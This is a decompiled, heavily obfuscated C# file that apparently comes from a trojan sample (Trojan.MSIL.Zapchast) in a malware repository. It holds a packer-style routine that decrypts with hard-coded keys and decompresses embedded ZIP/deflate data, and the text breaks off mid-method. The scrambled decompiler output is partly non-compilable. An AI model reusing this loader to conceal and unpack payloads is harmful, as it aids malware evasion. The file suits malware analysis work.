// Decompiled with JetBrains decompiler
// Type: .
// Assembly: 2012 Service, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 39F51609-4E86-4D72-B969-2F751869AD90
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.Zapchast.ct-d0902c6d183f4ab00c64dd9b787ec0d3719616aba79403f85e3b221f1f0c51c4.exe

using \u0004;
using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;

namespace \u0004
{
  internal class \u0001
  {
    public static string \u0001;

    private static bool \u0001(Assembly executingAssembly, Assembly callingAssembly)
    {
label_0:
      byte[] publicKey1 = executingAssembly.GetName().GetPublicKey();
      byte[] publicKey2 = callingAssembly.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    public static byte[] \u0001(byte[] buffer)
    {
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u0001.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      \u0001.\u000F obj1 = new \u0001.\u000F(buffer);
      byte[] buf = new byte[0];
      int num1 = obj1.\u0002();
      int num2 = num1;
      int num3;
      int num4;
      for (int index = 67324752; num2 == index; num2 = num4)
      {
        short num5 = (short) obj1.\u0001();
        int num6 = obj1.\u0001();
        int num7 = obj1.\u0001();
        if (num1 == 67324752)
        {
          num4 = (int) num5;
          int num8 = 20;
          if (num8 == 0)
          {
            index = num8;
            continue;
          }
          if (num4 == num8 && num6 == 0 && num7 == 8)
          {
            obj1.\u0002();
            if (true)
            {
              obj1.\u0002();
              num3 = obj1.\u0002();
              goto label_10;
            }
            else
              goto label_28;
          }
        }
        throw new FormatException("Wrong Header Signature");
      }
      goto label_16;
label_10:
      int length1 = obj1.\u0002();
      int count1 = obj1.\u0001();
      int count2 = obj1.\u0001();
      if (count1 > 0)
      {
        byte[] buffer1 = new byte[count1];
        obj1.Read(buffer1, 0, count1);
      }
label_12:
      if (count2 <= 0)
        goto label_14;
label_13:
      byte[] buffer2 = new byte[count2];
      obj1.Read(buffer2, 0, count2);
label_14:
      byte[] numArray1 = new byte[obj1.Length - obj1.Position];
      obj1.Read(numArray1, 0, numArray1.Length);
      \u0001.\u0001 obj2 = new \u0001.\u0001(numArray1);
label_15:
      buf = new byte[length1];
      obj2.\u0001(buf, 0, buf.Length);
      goto label_51;
label_16:
      int num9 = num1 >> 24;
      int length2;
      int offset;
      if (true)
      {
        if (num1 - (num9 << 24) != 8223355)
          throw new FormatException("Unknown Header");
        if (num9 == 1)
        {
          num3 = obj1.\u0002();
          if (true)
          {
            length2 = num3;
            if (true)
            {
              buf = new byte[length2];
              offset = 0;
              goto label_25;
            }
            else
              goto label_12;
          }
          else
            goto label_10;
        }
        else
          goto label_26;
      }
      else
        goto label_13;
label_24:
      int length3;
      byte[] numArray2 = new byte[length3];
      obj1.Read(numArray2, 0, numArray2.Length);
      int len;
      new \u0001.\u0001(numArray2).\u0001(buf, offset, len);
      offset += len;
label_25:
      if (offset < length2)
      {
        int num10 = obj1.\u0002();
        if (true)
        {
          len = obj1.\u0002();
          length3 = num10;
          goto label_24;
        }
        else
          goto label_41;
      }
label_26:
      byte[] key1;
      if (num9 == 2)
        key1 = new byte[8]
        {
          (byte) 139,
          (byte) 241,
          (byte) 86,
          (byte) 109,
          (byte) 7,
          (byte) 125,
          (byte) 177,
          (byte) 243
        };
      else
        goto label_38;
label_28:
      byte[] iv1 = new byte[8]
      {
        (byte) 203,
        (byte) 109,
        (byte) 197,
        (byte) 249,
        (byte) 170,
        (byte) 10,
        (byte) 240,
        (byte) 20
      };
      if (true)
      {
        using (\u0002.\u0004 obj3 = new \u0002.\u0004())
        {
          using (ICryptoTransform cryptoTransform = obj3.\u0001(key1, iv1, true))
            buf = \u0001.\u0001(cryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4));
        }
      }
      else
        goto label_15;
label_38:
      byte[] key2;
      byte[] iv2;
      if (num9 == 3)
      {
        length3 = 16;
        if (length3 != 0)
        {
          byte[] numArray3 = new byte[length3];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray3, __fieldref (\u0005.\u0003.\u0001));
          key2 = numArray3;
          iv2 = new byte[16]
          {
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2,
            (byte) 2
          };
        }
        else
          goto label_24;
      }
      else
        goto label_51;
label_41:
      using (\u0003.\u0003 obj4 = new \u0003.\u0003())
      {
        using (ICryptoTransform cryptoTransform = obj4.\u0001(key2, iv2, true))
          buf = \u0001.\u0001(cryptoTransform.TransformFinalBlock(buffer, 4, buffer.Length - 4));
      }
label_51:
      obj1.Close();
      return buf;
    }

    public static byte[] \u0002(byte[] buffer) => \u0001.\u0001(buffer, 1, (byte[]) null, (byte[]) null);

    public static byte[] \u0001(byte[] buffer, byte[] key, byte[] iv) => \u0001.\u0001(buffer, 2, key, iv);

    public static byte[] \u0002(byte[] buffer, byte[] key, byte[] iv) => \u0001.\u0001(buffer, 3, key, iv);

    private static byte[] \u0001(byte[] buffer, int version, byte[] key, byte[] iv)
    {
      try
      {
        \u0001.\u000F obj1 = new \u0001.\u000F();
        \u0001.\u0006 obj2;
        int srcOffset;
        switch (version)
        {
          case 0:
            \u0001.\u0006 obj3 = new \u0001.\u0006();
            if (true)
            {
              obj2 = obj3;
              goto label_58;
            }
            else
              goto label_58;
          case 1:
            if (true)
            {
              obj1.\u0002(25000571);
              obj1.\u0002(buffer.Length);
              srcOffset = 0;
              goto label_36;
            }
            else
              break;
          case 2:
            obj1.\u0002(41777787);
            byte[] inputBuffer1 = \u0001.\u0001(buffer, 1, (byte[]) null, (byte[]) null);
            using (\u0002.\u0004 obj4 = new \u0002.\u0004())
            {
              using (ICryptoTransform cryptoTransform = obj4.\u0001(key, iv, false))
              {
                byte[] buffer1 = cryptoTransform.TransformFinalBlock(inputBuffer1, 0, inputBuffer1.Length);
                obj1.Write(buffer1, 0, buffer1.Length);
                goto default;
              }
            }
          case 3:
            obj1.\u0002(58555003);
            byte[] inputBuffer2 = \u0001.\u0001(buffer, 1, (byte[]) null, (byte[]) null);
            using (\u0003.\u0003 obj5 = new \u0003.\u0003())
            {
              using (ICryptoTransform cryptoTransform = obj5.\u0001(key, iv, false))
              {
                byte[] buffer2 = cryptoTransform.TransformFinalBlock(inputBuffer2, 0, inputBuffer2.Length);
                obj1.Write(buffer2, 0, buffer2.Length);
                goto default;
              }
            }
          default:
label_55:
            obj1.Flush();
            obj1.Close();
            return obj1.ToArray();
        }
label_23:
        obj1.\u0001(0);
        obj1.\u0001(8);
        long num1;
        obj1.\u0002((int) num1);
        uint num2;
        obj1.\u0002((int) num2);
        long totalOut;
        obj1.\u0002((int) totalOut);
        obj1.\u0002(buffer.Length);
        byte[] bytes;
        obj1.\u0001(bytes.Length);
        obj1.\u0001(0);
        obj1.\u0001(0);
        obj1.\u0001(0);
        obj1.\u0001(0);
        obj1.\u0002(0);
        long position1;
        if (true)
        {
          obj1.\u0002(0);
          obj1.Write(bytes, 0, bytes.Length);
          obj1.\u0002(101010256);
          obj1.\u0001(0);
          obj1.\u0001(0);
          obj1.\u0001(1);
          obj1.\u0001(1);
          obj1.\u0002(46 + bytes.Length);
          obj1.\u0002((int) ((long) (30 + bytes.Length) + totalOut));
          obj1.\u0001(0);
          obj1.Seek(position1, SeekOrigin.Begin);
          obj1.\u0002((int) totalOut);
          goto label_55;
        }
        else
          goto label_58;
label_30:
        \u0001.\u0006 obj6;
        while (!obj6.IsNeedingInput)
        {
          byte[] numArray = new byte[512];
          int count = obj6.\u0001(numArray);
          if (count > 0)
            obj1.Write(numArray, 0, count);
          else
            break;
        }
        obj6.\u0001();
        goto label_34;
label_32:
        byte[] numArray1 = new byte[512];
        int count1 = obj6.\u0001(numArray1);
        if (count1 > 0)
          obj1.Write(numArray1, 0, count1);
        else
          goto label_35;
label_34:
        if (!obj6.IsFinished)
          goto label_32;
label_35:
        long position2 = obj1.Position;
        long position3;
        obj1.Position = position3;
        obj1.\u0002((int) obj6.TotalOut);
        obj1.Position = position2;
        byte[] numArray2;
        srcOffset += numArray2.Length;
label_36:
        if (srcOffset < buffer.Length)
        {
          numArray2 = new byte[Math.Min(2097151, buffer.Length - srcOffset)];
          Buffer.BlockCopy((Array) buffer, srcOffset, (Array) numArray2, 0, numArray2.Length);
          position3 = obj1.Position;
          obj1.\u0002(0);
          obj1.\u0002(numArray2.Length);
          obj6 = new \u0001.\u0006();
          obj6.\u0001(numArray2);
          goto label_30;
        }
        else
          goto label_55;
label_58:
        DateTime now = DateTime.Now;
        int num3 = (now.Year - 1980 & (int) sbyte.MaxValue) << 25 | now.Month << 21 | now.Day << 16;
        int num4 = now.Hour << 11;
        while (true)
        {
          num1 = (long) ((uint) (num3 | num4 | now.Minute << 5) | (uint) now.Second >> 1);
          uint[] numArray3 = new uint[256]
          {
            0U,
            1996959894U,
            3993919788U,
            2567524794U,
            124634137U,
            1886057615U,
            3915621685U,
            2657392035U,
            249268274U,
            2044508324U,
            3772115230U,
            2547177864U,
            162941995U,
            2125561021U,
            3887607047U,
            2428444049U,
            498536548U,
            1789927666U,
            4089016648U,
            2227061214U,
            450548861U,
            1843258603U,
            4107580753U,
            2211677639U,
            325883990U,
            1684777152U,
            4251122042U,
            2321926636U,
            335633487U,
            1661365465U,
            4195302755U,
            2366115317U,
            997073096U,
            1281953886U,
            3579855332U,
            2724688242U,
            1006888145U,
            1258607687U,
            3524101629U,
            2768942443U,
            901097722U,
            1119000684U,
            3686517206U,
            2898065728U,
            853044451U,
            1172266101U,
            3705015759U,
            2882616665U,
            651767980U,
            1373503546U,
            3369554304U,
            3218104598U,
            565507253U,
            1454621731U,
            3485111705U,
            3099436303U,
            671266974U,
            1594198024U,
            3322730930U,
            2970347812U,
            795835527U,
            1483230225U,
            3244367275U,
            3060149565U,
            1994146192U,
            31158534U,
            2563907772U,
            4023717930U,
            1907459465U,
            112637215U,
            2680153253U,
            3904427059U,
            2013776290U,
            251722036U,
            2517215374U,
            3775830040U,
            2137656763U,
            141376813U,
            2439277719U,
            3865271297U,
            1802195444U,
            476864866U,
            2238001368U,
            4066508878U,
            1812370925U,
            453092731U,
            2181625025U,
            4111451223U,
            1706088902U,
            314042704U,
            2344532202U,
            4240017532U,
            1658658271U,
            366619977U,
            2362670323U,
            4224994405U,
            1303535960U,
            984961486U,
            2747007092U,
            3569037538U,
            1256170817U,
            1037604311U,
            2765210733U,
            3554079995U,
            1131014506U,
            879679996U,
            2909243462U,
            3663771856U,
            1141124467U,
            855842277U,
            2852801631U,
            3708648649U,
            1342533948U,
            654459306U,
            3188396048U,
            3373015174U,
            1466479909U,
            544179635U,
            3110523913U,
            3462522015U,
            1591671054U,
            702138776U,
            2966460450U,
            3352799412U,
            1504918807U,
            783551873U,
            3082640443U,
            3233442989U,
            3988292384U,
            2596254646U,
            62317068U,
            1957810842U,
            3939845945U,
            2647816111U,
            81470997U,
            1943803523U,
            3814918930U,
            2489596804U,
            225274430U,
            2053790376U,
            3826175755U,
            2466906013U,
            167816743U,
            2097651377U,
            4027552580U,
            2265490386U,
            503444072U,
            1762050814U,
            4150417245U,
            2154129355U,
            426522225U,
            1852507879U,
            4275313526U,
            2312317920U,
            282753626U,
            1742555852U,
            4189708143U,
            2394877945U,
            397917763U,
            1622183637U,
            3604390888U,
            2714866558U,
            953729732U,
            1340076626U,
            3518719985U,
            2797360999U,
            1068828381U,
            1219638859U,
            3624741850U,
            2936675148U,
            906185462U,
            1090812512U,
            3747672003U,
            2825379669U,
            829329135U,
            1181335161U,
            3412177804U,
            3160834842U,
            628085408U,
            1382605366U,
            3423369109U,
            3138078467U,
            570562233U,
            1426400815U,
            3317316542U,
            2998733608U,
            733239954U,
            1555261956U,
            3268935591U,
            3050360625U,
            752459403U,
            1541320221U,
            2607071920U,
            3965973030U,
            1969922972U,
            40735498U,
            2617837225U,
            3943577151U,
            1913087877U,
            83908371U,
            2512341634U,
            3803740692U,
            2075208622U,
            213261112U,
            2463272603U,
            3855990285U,
            2094854071U,
            198958881U,
            2262029012U,
            4057260610U,
            1759359992U,
            534414190U,
            2176718541U,
            4139329115U,
            1873836001U,
            414664567U,
            2282248934U,
            4279200368U,
            1711684554U,
            285281116U,
            2405801727U,
            4167216745U,
            1634467795U,
            376229701U,
            2685067896U,
            3608007406U,
            1308918612U,
            956543938U,
            2808555105U,
            3495958263U,
            1231636301U,
            1047427035U,
            2932959818U,
            3654703836U,
            1088359270U,
            936918000U,
            2847714899U,
            3736837829U,
            1202900863U,
            817233897U,
            3183342108U,
            3401237130U,
            1404277552U,
            615818150U,
            3134207493U,
            3453421203U,
            1423857449U,
            601450431U,
            3009837614U,
            3294710456U,
            1567103746U,
            711928724U,
            3020668471U,
            3272380065U,
            1510334235U,
            755167117U
          };
          uint maxValue = uint.MaxValue;
          num2 = maxValue;
          int num5 = 0;
          int num6 = buffer.Length;
          int num7;
          if (true)
            num7 = num6;
          else
            goto label_6;
label_5:
          num6 = num7;
label_6:
          if ((num7 = num6 - 1) >= 0)
          {
            num2 = numArray3[(IntPtr) (uint) (((int) num2 ^ (int) buffer[num5++]) & (int) byte.MaxValue)] ^ num2 >> 8;
            goto label_5;
          }
          else
          {
            int num8 = (int) num2 ^ (int) maxValue;
            if (true)
            {
              num2 = (uint) num8;
              obj1.\u0002(67324752);
              obj1.\u0001(20);
              obj1.\u0001(0);
              obj1.\u0001(8);
              obj1.\u0002((int) num1);
              obj1.\u0002((int) num2);
              position1 = obj1.Position;
              obj1.\u0002(0);
              obj1.\u0002(buffer.Length);
              bytes = Encoding.UTF8.GetBytes("{data}");
              obj1.\u0001(bytes.Length);
            }
            else
              goto label_12;
label_9:
            obj1.\u0001(0);
            obj1.Write(bytes, 0, bytes.Length);
            obj2.\u0001(buffer);
            goto label_16;
label_12:
            int count2 = num8;
            int num9 = count2;
            int num10 = 0;
            if (num10 != 0)
            {
              num4 = num10;
              num3 = num9;
              continue;
            }
            byte[] numArray4;
            if (num9 > num10)
            {
              if (true)
                obj1.Write(numArray4, 0, count2);
              else
                goto label_9;
            }
            else
              break;
label_16:
            if (!obj2.IsNeedingInput)
            {
              numArray4 = new byte[512];
              if (true)
              {
                num8 = obj2.\u0001(numArray4);
                goto label_12;
              }
              else
                goto label_30;
            }
            else
              break;
          }
        }
        obj2.\u0001();
        if (true)
        {
          while (!obj2.IsFinished)
          {
            byte[] numArray5 = new byte[512];
            int count3 = obj2.\u0001(numArray5);
            if (count3 > 0)
              obj1.Write(numArray5, 0, count3);
            else
              break;
          }
        }
        totalOut = obj2.TotalOut;
        obj1.\u0002(33639248);
        obj1.\u0001(20);
        if (true)
        {
          obj1.\u0001(20);
          goto label_23;
        }
        else
          goto label_32;
      }
      catch (Exception ex)
      {
        \u0001.\u0001 = "ERR 2003: " + ex.Message;
        throw;
      }
    }

    internal sealed class \u0001
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      private const int \u0007 = 6;
      private const int \u0008 = 7;
      private const int \u000E = 8;
      private const int \u000F = 9;
      private const int \u0010 = 10;
      private const int \u0011 = 11;
      private const int \u0012 = 12;
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private static readonly int[] \u0003;
      private static readonly int[] \u0004;
      private int \u0013;
      private int \u0014;
      private int \u0015;
      private int \u0016;
      private int \u0017;
      private bool \u0001;
      private \u0001.\u0002 \u0001;
      private \u0001.\u0003 \u0001;
      private \u0001.\u0005 \u0001;
      private \u0001.\u0004 \u0001;
      private \u0001.\u0004 \u0002;

      public \u0001(byte[] bytes)
      {
        this.\u0001 = new \u0001.\u0002();
        this.\u0001 = new \u0001.\u0003();
        this.\u0013 = 2;
        this.\u0001.\u0001(bytes, 0, bytes.Length);
      }

      private bool \u0001()
      {
        int num1 = this.\u0001.\u0001();
label_26:
        int num2 = num1;
        int num3;
        for (int index1 = 258; num2 >= index1; num2 = num3)
        {
          int num4;
          int num5;
          do
          {
            num3 = this.\u0013;
            num5 = 7;
            if (num5 != 0)
            {
              switch (num3 - num5)
              {
                case 0:
                  do
                  {
                    if (((num4 = this.\u0001.\u0001(this.\u0001)) & -256) != 0)
                    {
                      if (num4 < 257)
                      {
                        if (true)
                          goto label_8;
                      }
                      else
                        goto label_12;
                    }
                    \u0001.\u0003 obj = this.\u0001;
                    int abyte = num4;
                    if (true)
                      goto label_31;
label_3:
                    continue;
label_31:
                    obj.\u0001(abyte);
                    goto label_3;
                  }
                  while (--num1 >= 258);
                  goto label_4;
label_8:
                  if (num4 >= 0)
                  {
                    this.\u0002 = (\u0001.\u0004) null;
                    this.\u0001 = (\u0001.\u0004) null;
                    continue;
                  }
                  goto label_9;
                case 1:
                  goto label_13;
                case 2:
                  goto label_18;
                case 3:
                  goto label_21;
                default:
                  goto label_26;
              }
            }
            else
              goto label_2;
          }
          while (false);
          goto label_11;
label_4:
          return true;
label_9:
          return false;
label_11:
          this.\u0013 = 2;
          return true;
label_12:
          this.\u0015 = \u0001.\u0001.\u0001[num4 - 257];
          this.\u0014 = \u0001.\u0001.\u0002[num4 - 257];
label_13:
          if (this.\u0014 > 0)
          {
            this.\u0013 = 8;
            int num6 = this.\u0001.\u0001(this.\u0014);
            if (num6 < 0)
              return false;
            this.\u0001.\u0001(this.\u0014);
            this.\u0015 += num6;
          }
          this.\u0013 = 9;
label_18:
          int index2 = this.\u0002.\u0001(this.\u0001);
          if (index2 < 0)
            return false;
          this.\u0016 = \u0001.\u0001.\u0003[index2];
          this.\u0014 = \u0001.\u0001.\u0004[index2];
label_21:
          if (this.\u0014 > 0)
          {
            this.\u0013 = 10;
            int num7 = this.\u0001.\u0001(this.\u0014);
            if (num7 < 0)
              return false;
            this.\u0001.\u0001(this.\u0014);
            this.\u0016 += num7;
          }
          this.\u0001.\u0001(this.\u0015, this.\u0016);
          num1 -= this.\u0015;
          this.\u0013 = 7;
          goto label_26;
label_2:
          index1 = num5;
        }
        return true;
      }

      private bool \u0002()
      {
        int num1;
        int num2;
        int num3;
        int num4;
        while (true)
        {
          int num5 = this.\u0013;
          if (true)
          {
            int num6 = num5;
            int num7;
            while (true)
            {
              switch (num6 - 2)
              {
                case 0:
                  num7 = this.\u0001 ? 1 : 0;
                  if (false)
                  {
                    num6 = num7;
                    continue;
                  }
                  goto label_3;
                case 1:
                  goto label_14;
                case 2:
                  goto label_18;
                case 3:
                  goto label_23;
                case 4:
                  goto label_27;
                case 5:
                case 6:
                case 7:
                case 8:
                  goto label_30;
                case 10:
                  goto label_31;
                default:
                  goto label_32;
              }
            }
label_3:
            if (num7 != 0)
            {
              this.\u0013 = 12;
              return false;
            }
            int num8 = this.\u0001.\u0001(3);
            if (true)
            {
              num1 = num8;
              break;
            }
            break;
label_14:
            int num9 = this.\u0017 = this.\u0001.\u0001(16);
            int num10 = 0;
            if (num10 == 0)
            {
              if (num9 < num10)
                return false;
              this.\u0001.\u0001(16);
              this.\u0013 = 4;
            }
            else
            {
              num4 = num10;
              num3 = num9;
              goto label_20;
            }
label_18:
            num2 = this.\u0001.\u0001(16);
            goto label_19;
label_27:
            if (!this.\u0001.\u0001(this.\u0001))
              return false;
            this.\u0001 = this.\u0001.\u0001();
            this.\u0002 = this.\u0001.\u0002();
            this.\u0013 = 7;
label_30:
            return this.\u0001();
label_31:
            return false;
label_32:
            int num11 = 0;
            return num11 != 0 ? num11 != 0 : num11 != 0;
          }
        }
        goto label_39;
label_19:
        num3 = num2;
        num4 = 0;
label_20:
        if (num3 < num4)
          return false;
        this.\u0001.\u0001(16);
        this.\u0013 = 5;
label_23:
        this.\u0017 -= this.\u0001.\u0001(this.\u0001, this.\u0017);
        if (this.\u0017 != 0)
          return !this.\u0001.IsNeedingInput;
        this.\u0013 = 2;
        return true;
label_39:
        if (num1 < 0)
          return false;
        do
        {
          this.\u0001.\u0001(3);
          if ((num1 & 1) != 0)
            this.\u0001 = true;
          switch (num1 >> 1)
          {
            case 0:
              this.\u0001.\u0001();
              this.\u0013 = 3;
              goto label_13;
            case 1:
              this.\u0001 = \u0001.\u0004.\u0001;
              this.\u0002 = \u0001.\u0004.\u0002;
              this.\u0013 = 7;
              if (false)
                goto label_19;
              else
                goto label_13;
            case 2:
              continue;
            default:
              goto label_13;
          }
        }
        while (false);
        this.\u0001 = new \u0001.\u0005();
        this.\u0013 = 6;
label_13:
        return true;
      }

      public int \u0001(byte[] buf, int offset, int len)
      {
        int num1;
        int num2;
        if (true)
        {
          int num3 = 0;
          if (num3 != 0)
          {
            num2 = num3;
            goto label_5;
          }
          else
          {
            num1 = num3;
            goto label_16;
          }
        }
        else
          goto label_7;
label_3:
        int num4;
        int num5;
        int num6;
        if (num6 != 0)
        {
          if (num5 != num6)
          {
            num4 = this.\u0001.\u0001(buf, offset, len);
            num2 = offset;
          }
          else
            goto label_10;
        }
        else
          goto label_6;
label_5:
        num6 = num4;
        num5 = num2;
label_6:
        offset = num5 + num6;
label_7:
        num5 = num1;
        if (true)
        {
          int num7 = num4;
          num1 = num5 + num7;
          len -= num4;
          if (len == 0)
            return num1;
        }
        else
          goto label_12;
label_10:
        if (!this.\u0002())
          num5 = this.\u0001.\u0002();
        else
          goto label_16;
label_12:
        num6 = 0;
        if (num6 == 0)
        {
          if (num5 <= num6 || this.\u0013 == 11)
            return num1;
        }
        else
          goto label_3;
label_16:
        int num8 = this.\u0013;
        num6 = 11;
        num5 = num8;
        goto label_3;
      }

      static \u0001()
      {
label_0:
        int length1 = 29;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0003.\u0001));
          \u0001.\u0001.\u0001 = numArray1;
          while (true)
          {
            \u0001.\u0001.\u0002 = new int[29]
            {
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              0,
              1,
              1,
              1,
              1,
              2,
              2,
              2,
              2,
              3,
              3,
              3,
              3,
              4,
              4,
              4,
              4,
              5,
              5,
              5,
              5,
              0
            };
            if (true)
            {
              \u0001.\u0001.\u0003 = new int[30]
              {
                1,
                2,
                3,
                4,
                5,
                7,
                9,
                13,
                17,
                25,
                33,
                49,
                65,
                97,
                129,
                193,
                257,
                385,
                513,
                769,
                1025,
                1537,
                2049,
                3073,
                4097,
                6145,
                8193,
                12289,
                16385,
                24577
              };
              goto label_5;
            }
          }
          goto label_7;
label_5:
          int length2 = 30;
          if (length2 == 0)
          {
            length1 = length2;
            continue;
          }
          int[] numArray2 = new int[length2];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0005.\u0003.\u0001));
          \u0001.\u0001.\u0004 = numArray2;
label_7:
          if (true)
          {
            if (false)
              goto label_5;
            else
              break;
          }
          else
            goto label_0;
        }
      }
    }

    internal sealed class \u0002
    {
      private byte[] \u0001;
      private int \u0001 = 0;
      private int \u0002 = 0;
      private uint \u0001 = 0;
      private int \u0003 = 0;

      public int \u0001(int n)
      {
        while (this.\u0003 < n)
        {
          if (this.\u0001 == this.\u0002)
          {
            if (true)
            {
              if (true)
                return -1;
            }
            else
              break;
          }
          else if (true)
          {
            \u0001.\u0002 obj1 = this;
            int num1 = (int) obj1.\u0001;
            byte[] numArray1 = this.\u0001;
            \u0001.\u0002 obj2 = this;
            int num2;
            int num3 = num2 = obj2.\u0001;
            obj2.\u0001 = num2 + 1;
            int index1 = num3;
            int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
            byte[] numArray2 = this.\u0001;
            \u0001.\u0002 obj3 = this;
            int num5;
            int num6 = num5 = obj3.\u0001;
            obj3.\u0001 = num5 + 1;
            int index2 = num6;
            int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
            int num8 = (num4 | num7) << this.\u0003;
            obj1.\u0001 = (uint) (num1 | num8);
          }
          else
            continue;
          this.\u0003 += 16;
          break;
        }
        long num9 = (long) this.\u0001;
        int num10 = 1;
        int num11 = n;
        int num12;
        do
        {
          if (true)
          {
            int num13 = num11 & 31;
            num12 = num10 << num13;
            if (true)
            {
              num11 = 1;
              num10 = num12;
            }
            else
              goto label_15;
          }
        }
        while (num11 == 0);
        int num14 = num10 - num11;
        goto label_13;
label_15:
        num14 = num12;
label_13:
        long num15 = (long) num14;
        return (int) (num9 & num15);
      }

      public void \u0001(int n)
      {
label_0:
        this.\u0001 >>= n;
        do
        {
          if (true)
            this.\u0003 -= n;
          else
            goto label_0;
        }
        while (false);
      }

      public int AvailableBits => this.\u0003;

      public int AvailableBytes
      {
        get
        {
          int num1 = this.\u0002;
          int num2;
          int num3;
          while (true)
          {
            num2 = this.\u0001;
            if (true)
            {
              num3 = num1 - num2;
              if (false)
                num1 = num3;
              else
                goto label_7;
            }
            else
              break;
          }
label_2:
          do
          {
            if (true)
              num2 >>= 3;
          }
          while (false);
          return num1 + num2;
label_7:
          num2 = this.\u0003;
          num1 = num3;
          goto label_2;
        }
      }

      public void \u0001()
      {
        this.\u0001 >>= this.\u0003 & 7;
        this.\u0003 &= -8;
      }

      public bool IsNeedingInput => this.\u0001 == this.\u0002;

      public int \u0001(byte[] output, int offset, int length)
      {
        int num1 = 0;
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          int num4;
          while (true)
          {
            num3 = this.\u0003;
            if (true)
            {
              if (num3 <= 0)
                goto label_6;
              else
                goto label_4;
label_1:
              this.\u0001 >>= 8;
              this.\u0003 -= 8;
              --length;
              ++num2;
              continue;
label_4:
              num4 = length;
              if (true)
              {
                if (num4 > 0)
                {
                  output[offset++] = (byte) this.\u0001;
                  goto label_1;
                }
              }
              else
                break;
label_6:
              while (length != 0)
              {
                int num5 = this.\u0002 - this.\u0001;
                if (length > num5)
                  length = num5;
                Array.Copy((Array) this.\u0001, this.\u0001, (Array) output, offset, length);
                this.\u0001 += length;
                if ((this.\u0001 - this.\u0002 & 1) != 0)
                {
                  this.\u0001 = (uint) this.\u0001[this.\u0001++] & (uint) byte.MaxValue;
                  this.\u0003 = 8;
                }
                if (true)
                {
                  if (true)
                  {
                    if (true)
                    {
                      int num6 = num2;
                      if (false)
                        return num6;
                      int num7 = length;
                      return num6 + num7;
                    }
                  }
                  else
                    break;
                }
                else
                  goto label_1;
              }
              goto label_7;
            }
            else
              goto label_8;
          }
          num1 = num4;
        }
label_8:
        return num3;
label_7:
        return num2;
      }

      public void \u0002()
      {
        do
        {
          if (true)
            this.\u0001 = (uint) (this.\u0001 = this.\u0002 = this.\u0003 = 0);
        }
        while (false);
      }

      public void \u0001(byte[] buf, int off, int len)
      {
        if (true)
          goto label_6;
label_4:
        this.\u0003 += 8;
label_5:
        this.\u0001 = buf;
        this.\u0001 = off;
        int num;
        this.\u0002 = num;
        return;
label_6:
        if (this.\u0001 < this.\u0002)
          throw new InvalidOperationException();
        num = off + len;
        if (0 > off || off > num || num > buf.Length)
          throw new ArgumentOutOfRangeException();
        if ((len & 1) != 0)
        {
          this.\u0001 |= (uint) (((int) buf[off++] & (int) byte.MaxValue) << this.\u0003);
          goto label_4;
        }
        else
          goto label_5;
      }
    }

    internal sealed class \u0003
    {
      private const int \u0001 = 32768;
      private const int \u0002 = 32767;
      private byte[] \u0001 = new byte[32768];
      private int \u0003 = 0;
      private int \u0004 = 0;

      public void \u0001(int abyte)
      {
label_0:
        do
        {
          \u0001.\u0003 obj1 = this;
          int num1;
          int num2 = num1 = obj1.\u0004;
          obj1.\u0004 = num1 + 1;
          do
          {
            if (true)
            {
              if (num2 != 32768)
                goto label_3;
label_2:
              goto label_0;
label_3:
              if (true)
              {
                byte[] numArray = this.\u0001;
                \u0001.\u0003 obj2 = this;
                int num3;
                num2 = num3 = obj2.\u0003;
                obj2.\u0003 = num3 + 1;
                int index = num2;
                int num4 = (int) (byte) abyte;
                numArray[index] = (byte) num4;
                if (false)
                  goto label_2;
              }
              else
                goto label_0;
            }
            else
              goto label_0;
          }
          while (false);
          goto label_5;
        }
        while (false);
        goto label_7;
label_5:
        this.\u0003 &= (int) short.MaxValue;
        return;
label_7:
        throw new InvalidOperationException();
      }

      private void \u0001(int repStart, int len, int dist)
      {
        if (false)
          return;
        while (true)
        {
          int num1 = len;
          int num2;
          while (true)
          {
            num2 = num1 - 1;
            if (false)
              num1 = num2;
            else
              break;
          }
          len = num2;
          if (num1 > 0)
          {
            byte[] numArray = this.\u0001;
            \u0001.\u0003 obj = this;
            int num3;
            int num4 = num3 = obj.\u0003;
            obj.\u0003 = num3 + 1;
            int index = num4;
            int num5 = (int) this.\u0001[repStart++];
            numArray[index] = (byte) num5;
            this.\u0003 &= (int) short.MaxValue;
            int num6 = repStart;
